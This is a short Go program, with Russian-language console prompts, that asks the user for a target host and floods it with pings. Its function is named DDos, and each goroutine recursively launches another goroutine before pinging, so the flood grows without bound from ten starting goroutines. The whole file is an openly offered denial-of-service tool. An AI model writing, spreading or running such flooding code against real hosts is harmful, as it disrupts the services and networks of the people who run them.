package main

import (
	"fmt"

	"github.com/skorobogatov/input"
	"github.com/sparrc/go-ping"
)

func DDos(str string) {

	pinger, err := ping.NewPinger(str)
	fmt.Println("new")
	if err != nil {

		fmt.Printf("ERROR: %s\n", err.Error())

		return

	}
	go DDos(str)
	pinger.Run()

}
func main() {
	fmt.Println("Введите хост")
	var host string
	input.Scanf("%s", &host)
	for i := 0; i < 10; i++ {
		go DDos(host)
	}
	fmt.Println("Введите любой символ для завершения")
	var c string
	input.Scanf("%s", c)
}
